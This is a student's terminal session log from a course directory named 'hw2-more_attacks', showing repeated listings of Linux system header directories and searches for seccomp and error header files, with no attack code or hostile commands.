/usr/include/c++/5/bits/regex_error.h
/usr/include/linux/can/error.h
/usr/include/x86_64-linux-gnu/gpg-error.h
/usr/include/x86_64-linux-gnu/bits/error.h
/usr/src/linux-headers-4.4.0-130/arch/ia64/sn/include/ioerror.h
/usr/src/linux-headers-4.4.0-130/arch/mips/include/asm/fw/cfe/cfe_error.h
/usr/src/linux-headers-4.4.0-130/include/uapi/linux/can/error.h
/usr/src/linux-headers-4.4.0-130-generic/include/config/ata/verbose/error.h
/usr/src/linux-headers-4.4.0-133/arch/ia64/sn/include/ioerror.h
/usr/src/linux-headers-4.4.0-133/arch/mips/include/asm/fw/cfe/cfe_error.h
/usr/src/linux-headers-4.4.0-133/include/uapi/linux/can/error.h
/usr/src/linux-headers-4.4.0-133-generic/include/config/ata/verbose/error.h
/usr/src/linux-headers-4.4.0-134/arch/ia64/sn/include/ioerror.h
/usr/src/linux-headers-4.4.0-134/arch/mips/include/asm/fw/cfe/cfe_error.h
/usr/src/linux-headers-4.4.0-134/include/uapi/linux/can/error.h
/usr/src/linux-headers-4.4.0-134-generic/include/config/ata/verbose/error.h
/usr/src/linux-headers-4.4.0-137/arch/ia64/sn/include/ioerror.h
/usr/src/linux-headers-4.4.0-137/arch/mips/include/asm/fw/cfe/cfe_error.h
/usr/src/linux-headers-4.4.0-137/include/uapi/linux/can/error.h
/usr/src/linux-headers-4.4.0-137-generic/include/config/ata/verbose/error.h
/usr/src/linux-headers-4.4.0-138/arch/ia64/sn/include/ioerror.h
/usr/src/linux-headers-4.4.0-138/arch/mips/include/asm/fw/cfe/cfe_error.h
/usr/src/linux-headers-4.4.0-138/include/uapi/linux/can/error.h
/usr/src/linux-headers-4.4.0-138-generic/include/config/ata/verbose/error.h
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ ls /usr/include/
aio.h        envz.h            gnu-versions.h       misc        pcap-bpf.h     shadow.h       ttyent.h
aliases.h    err.h             grp.h                mntent.h    pcap.h         signal.h       uapi
alloca.h     errno.h           gshadow.h            monetary.h  pcap-namedb.h  sound          uchar.h
argp.h       error.h           iconv.h              mqueue.h    poll.h         spawn.h        ucontext.h
argz.h       execinfo.h        ifaddrs.h            mtd         printf.h       stab.h         ulimit.h
ar.h         expat_external.h  inttypes.h           net         protocols      stdc-predef.h  unistd.h
arpa         expat.h           langinfo.h           netash      pthread.h      stdint.h       ustat.h
asm          fcntl.h           lastlog.h            netatalk    pty.h          stdio_ext.h    utime.h
asm-generic  features.h        libgen.h             netax25     pwd.h          stdio.h        utmp.h
assert.h     fenv.h            libintl.h            netdb.h     python2.7      stdlib.h       utmpx.h
bits         fmtmsg.h          libio.h              neteconet   rdma           string.h       valgrind
btrfs        fnmatch.h         libssh2.h            netinet     re_comp.h      strings.h      values.h
byteswap.h   fpu_control.h     libssh2_publickey.h  netipx      regex.h        stropts.h      video
c++          fstab.h           libssh2_sftp.h       netiucv     regexp.h       sudo_plugin.h  wait.h
clang        fts.h             limits.h             netpacket   reglib         sys            wchar.h
complex.h    ftw.h             link.h               netrom      resolv.h       syscall.h      wctype.h
cpio.h       gawkapi.h         linux                netrose     rpc            sysexits.h     wordexp.h
crypt.h      _G_config.h       llvm-3.8             nfs         rpcsvc         syslog.h       X11
ctype.h      gconv.h           llvm-c-3.8           nl_types.h  sched.h        tar.h          x86_64-linux-gnu
dirent.h     gcrypt.h          locale.h             nss.h       scsi           termio.h       xen
dlfcn.h      getopt.h          malloc.h             obstack.h   search.h       termios.h      xfs
drm          glob.h            math.h               openssl     semaphore.h    tgmath.h       xlocale.h
elf.h        gnu               mcheck.h             paths.h     setjmp.h       thread_db.h    zconf.h
endian.h     gnumake.h         memory.h             pcap        sgtty.h        time.h         zlib.h
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ locate seccomp
/lib/x86_64-linux-gnu/libseccomp.so.2
/lib/x86_64-linux-gnu/libseccomp.so.2.3.1
/usr/include/linux/seccomp.h
/usr/lib/snapd/snap-seccomp
/usr/share/doc/libseccomp2
/usr/share/doc/libseccomp2/changelog.Debian.gz
/usr/share/doc/libseccomp2/copyright
/usr/share/doc/lxc-common/examples/seccomp-v1.conf
/usr/share/doc/lxc-common/examples/seccomp-v2-blacklist.conf
/usr/share/doc/lxc-common/examples/seccomp-v2.conf
/usr/share/man/man2/seccomp.2.gz
/usr/src/linux-headers-4.4.0-130/arch/arm64/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-130/arch/microblaze/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-130/arch/mips/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-130/arch/powerpc/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-130/arch/s390/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-130/arch/sh/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-130/arch/sparc/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-130/arch/x86/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-130/include/asm-generic/seccomp.h
/usr/src/linux-headers-4.4.0-130/include/linux/seccomp.h
/usr/src/linux-headers-4.4.0-130/include/uapi/linux/seccomp.h
/usr/src/linux-headers-4.4.0-130/samples/seccomp
/usr/src/linux-headers-4.4.0-130/samples/seccomp/Makefile
/usr/src/linux-headers-4.4.0-130/tools/testing/selftests/seccomp
/usr/src/linux-headers-4.4.0-130/tools/testing/selftests/seccomp/Makefile
/usr/src/linux-headers-4.4.0-130-generic/include/config/seccomp
/usr/src/linux-headers-4.4.0-130-generic/include/config/seccomp.h
/usr/src/linux-headers-4.4.0-130-generic/include/config/have/arch/seccomp
/usr/src/linux-headers-4.4.0-130-generic/include/config/have/arch/seccomp/filter.h
/usr/src/linux-headers-4.4.0-130-generic/include/config/seccomp/filter.h
/usr/src/linux-headers-4.4.0-133/arch/arm64/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-133/arch/microblaze/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-133/arch/mips/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-133/arch/powerpc/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-133/arch/s390/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-133/arch/sh/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-133/arch/sparc/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-133/arch/x86/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-133/include/asm-generic/seccomp.h
/usr/src/linux-headers-4.4.0-133/include/linux/seccomp.h
/usr/src/linux-headers-4.4.0-133/include/uapi/linux/seccomp.h
/usr/src/linux-headers-4.4.0-133/samples/seccomp
/usr/src/linux-headers-4.4.0-133/samples/seccomp/Makefile
/usr/src/linux-headers-4.4.0-133/tools/testing/selftests/seccomp
/usr/src/linux-headers-4.4.0-133/tools/testing/selftests/seccomp/Makefile
/usr/src/linux-headers-4.4.0-133-generic/include/config/seccomp
/usr/src/linux-headers-4.4.0-133-generic/include/config/seccomp.h
/usr/src/linux-headers-4.4.0-133-generic/include/config/have/arch/seccomp
/usr/src/linux-headers-4.4.0-133-generic/include/config/have/arch/seccomp/filter.h
/usr/src/linux-headers-4.4.0-133-generic/include/config/seccomp/filter.h
/usr/src/linux-headers-4.4.0-134/arch/arm64/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-134/arch/microblaze/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-134/arch/mips/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-134/arch/powerpc/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-134/arch/s390/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-134/arch/sh/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-134/arch/sparc/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-134/arch/x86/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-134/include/asm-generic/seccomp.h
/usr/src/linux-headers-4.4.0-134/include/linux/seccomp.h
/usr/src/linux-headers-4.4.0-134/include/uapi/linux/seccomp.h
/usr/src/linux-headers-4.4.0-134/samples/seccomp
/usr/src/linux-headers-4.4.0-134/samples/seccomp/Makefile
/usr/src/linux-headers-4.4.0-134/tools/testing/selftests/seccomp
/usr/src/linux-headers-4.4.0-134/tools/testing/selftests/seccomp/Makefile
/usr/src/linux-headers-4.4.0-134-generic/include/config/seccomp
/usr/src/linux-headers-4.4.0-134-generic/include/config/seccomp.h
/usr/src/linux-headers-4.4.0-134-generic/include/config/have/arch/seccomp
/usr/src/linux-headers-4.4.0-134-generic/include/config/have/arch/seccomp/filter.h
/usr/src/linux-headers-4.4.0-134-generic/include/config/seccomp/filter.h
/usr/src/linux-headers-4.4.0-137/arch/arm64/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-137/arch/microblaze/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-137/arch/mips/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-137/arch/powerpc/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-137/arch/s390/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-137/arch/sh/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-137/arch/sparc/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-137/arch/x86/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-137/include/asm-generic/seccomp.h
/usr/src/linux-headers-4.4.0-137/include/linux/seccomp.h
/usr/src/linux-headers-4.4.0-137/include/uapi/linux/seccomp.h
/usr/src/linux-headers-4.4.0-137/samples/seccomp
/usr/src/linux-headers-4.4.0-137/samples/seccomp/Makefile
/usr/src/linux-headers-4.4.0-137/tools/testing/selftests/seccomp
/usr/src/linux-headers-4.4.0-137/tools/testing/selftests/seccomp/Makefile
/usr/src/linux-headers-4.4.0-137-generic/include/config/seccomp
/usr/src/linux-headers-4.4.0-137-generic/include/config/seccomp.h
/usr/src/linux-headers-4.4.0-137-generic/include/config/have/arch/seccomp
/usr/src/linux-headers-4.4.0-137-generic/include/config/have/arch/seccomp/filter.h
/usr/src/linux-headers-4.4.0-137-generic/include/config/seccomp/filter.h
/usr/src/linux-headers-4.4.0-138/arch/arm64/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-138/arch/microblaze/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-138/arch/mips/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-138/arch/powerpc/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-138/arch/s390/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-138/arch/sh/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-138/arch/sparc/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-138/arch/x86/include/asm/seccomp.h
/usr/src/linux-headers-4.4.0-138/include/asm-generic/seccomp.h
/usr/src/linux-headers-4.4.0-138/include/linux/seccomp.h
/usr/src/linux-headers-4.4.0-138/include/uapi/linux/seccomp.h
/usr/src/linux-headers-4.4.0-138/samples/seccomp
/usr/src/linux-headers-4.4.0-138/samples/seccomp/Makefile
/usr/src/linux-headers-4.4.0-138/tools/testing/selftests/seccomp
/usr/src/linux-headers-4.4.0-138/tools/testing/selftests/seccomp/Makefile
/usr/src/linux-headers-4.4.0-138-generic/include/config/seccomp
/usr/src/linux-headers-4.4.0-138-generic/include/config/seccomp.h
/usr/src/linux-headers-4.4.0-138-generic/include/config/have/arch/seccomp
/usr/src/linux-headers-4.4.0-138-generic/include/config/have/arch/seccomp/filter.h
/usr/src/linux-headers-4.4.0-138-generic/include/config/seccomp/filter.h
/var/lib/dpkg/info/libseccomp2:amd64.list
/var/lib/dpkg/info/libseccomp2:amd64.md5sums
/var/lib/dpkg/info/libseccomp2:amd64.shlibs
/var/lib/dpkg/info/libseccomp2:amd64.symbols
/var/lib/dpkg/info/libseccomp2:amd64.triggers
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ 
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ 
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ ls /usr/include/
aio.h        envz.h            gnu-versions.h       misc        pcap-bpf.h     shadow.h       ttyent.h
aliases.h    err.h             grp.h                mntent.h    pcap.h         signal.h       uapi
alloca.h     errno.h           gshadow.h            monetary.h  pcap-namedb.h  sound          uchar.h
argp.h       error.h           iconv.h              mqueue.h    poll.h         spawn.h        ucontext.h
argz.h       execinfo.h        ifaddrs.h            mtd         printf.h       stab.h         ulimit.h
ar.h         expat_external.h  inttypes.h           net         protocols      stdc-predef.h  unistd.h
arpa         expat.h           langinfo.h           netash      pthread.h      stdint.h       ustat.h
asm          fcntl.h           lastlog.h            netatalk    pty.h          stdio_ext.h    utime.h
asm-generic  features.h        libgen.h             netax25     pwd.h          stdio.h        utmp.h
assert.h     fenv.h            libintl.h            netdb.h     python2.7      stdlib.h       utmpx.h
bits         fmtmsg.h          libio.h              neteconet   rdma           string.h       valgrind
btrfs        fnmatch.h         libssh2.h            netinet     re_comp.h      strings.h      values.h
byteswap.h   fpu_control.h     libssh2_publickey.h  netipx      regex.h        stropts.h      video
c++          fstab.h           libssh2_sftp.h       netiucv     regexp.h       sudo_plugin.h  wait.h
clang        fts.h             limits.h             netpacket   reglib         sys            wchar.h
complex.h    ftw.h             link.h               netrom      resolv.h       syscall.h      wctype.h
cpio.h       gawkapi.h         linux                netrose     rpc            sysexits.h     wordexp.h
crypt.h      _G_config.h       llvm-3.8             nfs         rpcsvc         syslog.h       X11
ctype.h      gconv.h           llvm-c-3.8           nl_types.h  sched.h        tar.h          x86_64-linux-gnu
dirent.h     gcrypt.h          locale.h             nss.h       scsi           termio.h       xen
dlfcn.h      getopt.h          malloc.h             obstack.h   search.h       termios.h      xfs
drm          glob.h            math.h               openssl     semaphore.h    tgmath.h       xlocale.h
elf.h        gnu               mcheck.h             paths.h     setjmp.h       thread_db.h    zconf.h
endian.h     gnumake.h         memory.h             pcap        sgtty.h        time.h         zlib.h
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ ls /usr/include/linux/
acct.h              ethtool.h             ipmi_msgdefs.h       net_tstamp.h       soundcard.h
adb.h               eventpoll.h           ipsec.h              nfc.h              sound.h
adfs_fs.h           fadvise.h             ipv6.h               nfs2.h             spi
affs_hardblocks.h   falloc.h              ipv6_route.h         nfs3.h             stat.h
agpgart.h           fanotify.h            ip_vs.h              nfs4.h             stddef.h
aio_abi.h           fb.h                  ipx.h                nfs4_mount.h       string.h
am437x-vpfe.h       fcntl.h               irda.h               nfsacl.h           sunrpc
android             fd.h                  irqnr.h              nfsd               suspend_ioctls.h
a.out.h             fdreg.h               isdn                 nfs_fs.h           swab.h
apm_bios.h          fib_rules.h           isdn_divertif.h      nfs.h              synclink.h
arcfb.h             fiemap.h              isdn.h               nfs_idmap.h        sysctl.h
atalk.h             filter.h              isdnif.h             nfs_mount.h        sysinfo.h
atmapi.h            firewire-cdev.h       isdn_ppp.h           nl80211.h          target_core_user.h
atmarp.h            firewire-constants.h  iso_fs.h             n_r3964.h          taskstats.h
atmbr2684.h         flat.h                ivtvfb.h             nubus.h            tc_act
atmclip.h           fou.h                 ivtv.h               nvme_ioctl.h       tc_ematch
atmdev.h            fs.h                  ixjuser.h            nvram.h            tcp.h
atm_eni.h           fsl_hypervisor.h      jffs2.h              omap3isp.h         tcp_metrics.h
atm.h               fuse.h                joystick.h           omapfb.h           telephony.h
atm_he.h            futex.h               kcmp.h               oom.h              termios.h
atm_idt77105.h      gameport.h            kdev_t.h             openvswitch.h      thermal.h
atmioc.h            genetlink.h           kd.h                 packet_diag.h      time.h
atmlec.h            gen_stats.h           kernelcapi.h         param.h            times.h
atmmpc.h            gfs2_ondisk.h         kernel.h             parport.h          timex.h
atm_nicstar.h       gigaset_dev.h         kernel-page-flags.h  patchkey.h         tiocl.h
atmppp.h            gsmmux.h              kexec.h              pci.h              tipc_config.h
atmsap.h            hdlc                  keyboard.h           pci_regs.h         tipc.h
atmsvc.h            hdlcdrv.h             keyctl.h             perf_event.h       tipc_netlink.h
atm_tcp.h           hdlc.h                kvm.h                personality.h      toshiba.h
atm_zatm.h          hdreg.h               kvm_para.h           pfkeyv2.h          tty_flags.h
audit.h             hiddev.h              l2tp.h               pg.h               tty.h
aufs_type.h         hid.h                 libc-compat.h        phantom.h          types.h
auto_fs4.h          hidraw.h              limits.h             phonet.h           udf_fs_i.h
auto_fs.h           hpet.h                llc.h                pktcdvd.h          udp.h
auxvec.h            hsi                   loop.h               pkt_cls.h          uhid.h
ax25.h              hsr_netlink.h         lp.h                 pkt_sched.h        uinput.h
b1lli.h             hw_breakpoint.h       lwtunnel.h           pmu.h              uio.h
baycom.h            hyperv.h              magic.h              poll.h             ultrasound.h
bcm933xx_hcs.h      hysdn_if.h            major.h              posix_types.h      un.h
bfs_fs.h            i2c-dev.h             map_to_7segment.h    ppdev.h            unistd.h
binfmts.h           i2c.h                 matroxfb.h           ppp-comp.h         unix_diag.h
blkpg.h             i2o-dev.h             mdio.h               ppp_defs.h         usb
blktrace_api.h      i8k.h                 media-bus-format.h   ppp-ioctl.h        usbdevice_fs.h
bpf_common.h        icmp.h                media.h              pps.h              usbip.h
bpf.h               icmpv6.h              mei.h                prctl.h            userfaultfd.h
bpqether.h          if_addr.h             membarrier.h         psci.h             utime.h
bsg.h               if_addrlabel.h        memfd.h              ptp_clock.h        utsname.h
btrfs.h             if_alg.h              mempolicy.h          ptrace.h           uuid.h
byteorder           if_arcnet.h           meye.h               qnx4_fs.h          uvcvideo.h
caif                if_arp.h              mic_common.h         qnxtypes.h         v4l2-common.h
can                 if_bonding.h          mic_ioctl.h          quota.h            v4l2-controls.h
can.h               if_bridge.h           mii.h                radeonfb.h         v4l2-dv-timings.h
capability.h        if_cablemodem.h       minix_fs.h           raid               v4l2-mediabus.h
capi.h              if_eql.h              mman.h               random.h           v4l2-subdev.h
cciss_defs.h        if_ether.h            mmc                  raw.h              version.h
cciss_ioctl.h       if_fc.h               mmtimer.h            rds.h              veth.h
cdrom.h             if_fddi.h             mpls.h               reboot.h           vfio.h
cgroupstats.h       if_frad.h             mpls_iptunnel.h      reiserfs_fs.h      vhost.h
chio.h              if.h                  mqueue.h             reiserfs_xattr.h   videodev2.h
cm4000_cs.h         if_hippi.h            mroute6.h            resource.h         virtio_9p.h
cn_proc.h           if_infiniband.h       mroute.h             rfkill.h           virtio_balloon.h
coda.h              if_link.h             msdos_fs.h           romfs_fs.h         virtio_blk.h
coda_psdev.h        if_ltalk.h            msg.h                rose.h             virtio_config.h
coff.h              if_packet.h           mtio.h               route.h            virtio_console.h
connector.h         if_phonet.h           nbd.h                rtc.h              virtio_gpu.h
const.h             if_plip.h             ncp_fs.h             rtnetlink.h        virtio_ids.h
cramfs_fs.h         if_ppp.h              ncp.h                scc.h              virtio_input.h
cuda.h              if_pppol2tp.h         ncp_mount.h          sched.h            virtio_net.h
cyclades.h          if_pppox.h            ncp_no.h             scif_ioctl.h       virtio_pci.h
cycx_cfm.h          if_slip.h             ndctl.h              screen_info.h      virtio_ring.h
dcbnl.h             if_team.h             neighbour.h          sctp.h             virtio_rng.h
dccp.h              if_tun.h              netconf.h            sdla.h             virtio_scsi.h
dlmconstants.h      if_tunnel.h           netdevice.h          seccomp.h          virtio_types.h
dlm_device.h        if_vlan.h             net_dropmon.h        securebits.h       vm_sockets.h
dlm.h               if_x25.h              netfilter            selinux_netlink.h  vt.h
dlm_netlink.h       igmp.h                netfilter_arp        sem.h              wait.h
dlm_plock.h         iio                   netfilter_arp.h      serial_core.h      wanrouter.h
dm-ioctl.h          ila.h                 netfilter_bridge     serial.h           watchdog.h
dm-log-userspace.h  in6.h                 netfilter_bridge.h   serial_reg.h       wimax
dn.h                inet_diag.h           netfilter_decnet.h   serio.h            wimax.h
dqblk_xfs.h         in.h                  netfilter.h          shm.h              wireless.h
dvb                 inotify.h             netfilter_ipv4       signalfd.h         x25.h
edd.h               input-event-codes.h   netfilter_ipv4.h     signal.h           xattr.h
efs_fs_sb.h         input.h               netfilter_ipv6       smiapp.h           xfrm.h
elfcore.h           in_route.h            netfilter_ipv6.h     snmp.h             xilinx-v4l2-controls.h
elf-em.h            ioctl.h               net.h                sock_diag.h        zorro.h
elf-fdpic.h         ip6_tunnel.h          netlink_diag.h       socket.h           zorro_ids.h
elf.h               ipc.h                 netlink.h            sockios.h
errno.h             ip.h                  net_namespace.h      sonet.h
errqueue.h          ipmi.h                netrom.h             sonypi.h
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ less /usr/include/error.h 
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ less /usr/include/errno.h 
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ 
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ less /usr/include/linux/errno.h 
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ 
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ ls /usr/include/linux/
acct.h              ethtool.h             ipmi_msgdefs.h       net_tstamp.h       soundcard.h
adb.h               eventpoll.h           ipsec.h              nfc.h              sound.h
adfs_fs.h           fadvise.h             ipv6.h               nfs2.h             spi
affs_hardblocks.h   falloc.h              ipv6_route.h         nfs3.h             stat.h
agpgart.h           fanotify.h            ip_vs.h              nfs4.h             stddef.h
aio_abi.h           fb.h                  ipx.h                nfs4_mount.h       string.h
am437x-vpfe.h       fcntl.h               irda.h               nfsacl.h           sunrpc
android             fd.h                  irqnr.h              nfsd               suspend_ioctls.h
a.out.h             fdreg.h               isdn                 nfs_fs.h           swab.h
apm_bios.h          fib_rules.h           isdn_divertif.h      nfs.h              synclink.h
arcfb.h             fiemap.h              isdn.h               nfs_idmap.h        sysctl.h
atalk.h             filter.h              isdnif.h             nfs_mount.h        sysinfo.h
atmapi.h            firewire-cdev.h       isdn_ppp.h           nl80211.h          target_core_user.h
atmarp.h            firewire-constants.h  iso_fs.h             n_r3964.h          taskstats.h
atmbr2684.h         flat.h                ivtvfb.h             nubus.h            tc_act
atmclip.h           fou.h                 ivtv.h               nvme_ioctl.h       tc_ematch
atmdev.h            fs.h                  ixjuser.h            nvram.h            tcp.h
atm_eni.h           fsl_hypervisor.h      jffs2.h              omap3isp.h         tcp_metrics.h
atm.h               fuse.h                joystick.h           omapfb.h           telephony.h
atm_he.h            futex.h               kcmp.h               oom.h              termios.h
atm_idt77105.h      gameport.h            kdev_t.h             openvswitch.h      thermal.h
atmioc.h            genetlink.h           kd.h                 packet_diag.h      time.h
atmlec.h            gen_stats.h           kernelcapi.h         param.h            times.h
atmmpc.h            gfs2_ondisk.h         kernel.h             parport.h          timex.h
atm_nicstar.h       gigaset_dev.h         kernel-page-flags.h  patchkey.h         tiocl.h
atmppp.h            gsmmux.h              kexec.h              pci.h              tipc_config.h
atmsap.h            hdlc                  keyboard.h           pci_regs.h         tipc.h
atmsvc.h            hdlcdrv.h             keyctl.h             perf_event.h       tipc_netlink.h
atm_tcp.h           hdlc.h                kvm.h                personality.h      toshiba.h
atm_zatm.h          hdreg.h               kvm_para.h           pfkeyv2.h          tty_flags.h
audit.h             hiddev.h              l2tp.h               pg.h               tty.h
aufs_type.h         hid.h                 libc-compat.h        phantom.h          types.h
auto_fs4.h          hidraw.h              limits.h             phonet.h           udf_fs_i.h
auto_fs.h           hpet.h                llc.h                pktcdvd.h          udp.h
auxvec.h            hsi                   loop.h               pkt_cls.h          uhid.h
ax25.h              hsr_netlink.h         lp.h                 pkt_sched.h        uinput.h
b1lli.h             hw_breakpoint.h       lwtunnel.h           pmu.h              uio.h
baycom.h            hyperv.h              magic.h              poll.h             ultrasound.h
bcm933xx_hcs.h      hysdn_if.h            major.h              posix_types.h      un.h
bfs_fs.h            i2c-dev.h             map_to_7segment.h    ppdev.h            unistd.h
binfmts.h           i2c.h                 matroxfb.h           ppp-comp.h         unix_diag.h
blkpg.h             i2o-dev.h             mdio.h               ppp_defs.h         usb
blktrace_api.h      i8k.h                 media-bus-format.h   ppp-ioctl.h        usbdevice_fs.h
bpf_common.h        icmp.h                media.h              pps.h              usbip.h
bpf.h               icmpv6.h              mei.h                prctl.h            userfaultfd.h
bpqether.h          if_addr.h             membarrier.h         psci.h             utime.h
bsg.h               if_addrlabel.h        memfd.h              ptp_clock.h        utsname.h
btrfs.h             if_alg.h              mempolicy.h          ptrace.h           uuid.h
byteorder           if_arcnet.h           meye.h               qnx4_fs.h          uvcvideo.h
caif                if_arp.h              mic_common.h         qnxtypes.h         v4l2-common.h
can                 if_bonding.h          mic_ioctl.h          quota.h            v4l2-controls.h
can.h               if_bridge.h           mii.h                radeonfb.h         v4l2-dv-timings.h
capability.h        if_cablemodem.h       minix_fs.h           raid               v4l2-mediabus.h
capi.h              if_eql.h              mman.h               random.h           v4l2-subdev.h
cciss_defs.h        if_ether.h            mmc                  raw.h              version.h
cciss_ioctl.h       if_fc.h               mmtimer.h            rds.h              veth.h
cdrom.h             if_fddi.h             mpls.h               reboot.h           vfio.h
cgroupstats.h       if_frad.h             mpls_iptunnel.h      reiserfs_fs.h      vhost.h
chio.h              if.h                  mqueue.h             reiserfs_xattr.h   videodev2.h
cm4000_cs.h         if_hippi.h            mroute6.h            resource.h         virtio_9p.h
cn_proc.h           if_infiniband.h       mroute.h             rfkill.h           virtio_balloon.h
coda.h              if_link.h             msdos_fs.h           romfs_fs.h         virtio_blk.h
coda_psdev.h        if_ltalk.h            msg.h                rose.h             virtio_config.h
coff.h              if_packet.h           mtio.h               route.h            virtio_console.h
connector.h         if_phonet.h           nbd.h                rtc.h              virtio_gpu.h
const.h             if_plip.h             ncp_fs.h             rtnetlink.h        virtio_ids.h
cramfs_fs.h         if_ppp.h              ncp.h                scc.h              virtio_input.h
cuda.h              if_pppol2tp.h         ncp_mount.h          sched.h            virtio_net.h
cyclades.h          if_pppox.h            ncp_no.h             scif_ioctl.h       virtio_pci.h
cycx_cfm.h          if_slip.h             ndctl.h              screen_info.h      virtio_ring.h
dcbnl.h             if_team.h             neighbour.h          sctp.h             virtio_rng.h
dccp.h              if_tun.h              netconf.h            sdla.h             virtio_scsi.h
dlmconstants.h      if_tunnel.h           netdevice.h          seccomp.h          virtio_types.h
dlm_device.h        if_vlan.h             net_dropmon.h        securebits.h       vm_sockets.h
dlm.h               if_x25.h              netfilter            selinux_netlink.h  vt.h
dlm_netlink.h       igmp.h                netfilter_arp        sem.h              wait.h
dlm_plock.h         iio                   netfilter_arp.h      serial_core.h      wanrouter.h
dm-ioctl.h          ila.h                 netfilter_bridge     serial.h           watchdog.h
dm-log-userspace.h  in6.h                 netfilter_bridge.h   serial_reg.h       wimax
dn.h                inet_diag.h           netfilter_decnet.h   serio.h            wimax.h
dqblk_xfs.h         in.h                  netfilter.h          shm.h              wireless.h
dvb                 inotify.h             netfilter_ipv4       signalfd.h         x25.h
edd.h               input-event-codes.h   netfilter_ipv4.h     signal.h           xattr.h
efs_fs_sb.h         input.h               netfilter_ipv6       smiapp.h           xfrm.h
elfcore.h           in_route.h            netfilter_ipv6.h     snmp.h             xilinx-v4l2-controls.h
elf-em.h            ioctl.h               net.h                sock_diag.h        zorro.h
elf-fdpic.h         ip6_tunnel.h          netlink_diag.h       socket.h           zorro_ids.h
elf.h               ipc.h                 netlink.h            sockios.h
errno.h             ip.h                  net_namespace.h      sonet.h
errqueue.h          ipmi.h                netrom.h             sonypi.h
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ less /usr/include/linux/errno.h 
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ ls /usr/include/
aio.h        envz.h            gnu-versions.h       misc        pcap-bpf.h     shadow.h       ttyent.h
aliases.h    err.h             grp.h                mntent.h    pcap.h         signal.h       uapi
alloca.h     errno.h           gshadow.h            monetary.h  pcap-namedb.h  sound          uchar.h
argp.h       error.h           iconv.h              mqueue.h    poll.h         spawn.h        ucontext.h
argz.h       execinfo.h        ifaddrs.h            mtd         printf.h       stab.h         ulimit.h
ar.h         expat_external.h  inttypes.h           net         protocols      stdc-predef.h  unistd.h
arpa         expat.h           langinfo.h           netash      pthread.h      stdint.h       ustat.h
asm          fcntl.h           lastlog.h            netatalk    pty.h          stdio_ext.h    utime.h
asm-generic  features.h        libgen.h             netax25     pwd.h          stdio.h        utmp.h
assert.h     fenv.h            libintl.h            netdb.h     python2.7      stdlib.h       utmpx.h
bits         fmtmsg.h          libio.h              neteconet   rdma           string.h       valgrind
btrfs        fnmatch.h         libssh2.h            netinet     re_comp.h      strings.h      values.h
byteswap.h   fpu_control.h     libssh2_publickey.h  netipx      regex.h        stropts.h      video
c++          fstab.h           libssh2_sftp.h       netiucv     regexp.h       sudo_plugin.h  wait.h
clang        fts.h             limits.h             netpacket   reglib         sys            wchar.h
complex.h    ftw.h             link.h               netrom      resolv.h       syscall.h      wctype.h
cpio.h       gawkapi.h         linux                netrose     rpc            sysexits.h     wordexp.h
crypt.h      _G_config.h       llvm-3.8             nfs         rpcsvc         syslog.h       X11
ctype.h      gconv.h           llvm-c-3.8           nl_types.h  sched.h        tar.h          x86_64-linux-gnu
dirent.h     gcrypt.h          locale.h             nss.h       scsi           termio.h       xen
dlfcn.h      getopt.h          malloc.h             obstack.h   search.h       termios.h      xfs
drm          glob.h            math.h               openssl     semaphore.h    tgmath.h       xlocale.h
elf.h        gnu               mcheck.h             paths.h     setjmp.h       thread_db.h    zconf.h
endian.h     gnumake.h         memory.h             pcap        sgtty.h        time.h         zlib.h
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ ls /usr/include/sys
